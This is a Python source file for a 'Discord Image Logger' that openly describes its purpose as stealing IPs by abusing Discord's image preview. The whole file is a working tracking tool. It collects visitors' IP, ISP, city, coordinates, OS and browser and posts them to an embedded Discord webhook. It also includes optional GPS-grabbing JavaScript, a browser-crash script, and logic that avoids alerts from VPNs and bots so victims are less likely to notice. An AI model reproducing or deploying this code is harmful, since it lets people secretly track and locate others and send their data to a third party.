# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1130266964540002347/gHm3kIcHRWao_-sSTIQFUzSUZ-UDGzoZNYk1FAkkUNDiw0rOXi2LJScpKJvVonzNYqxL",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
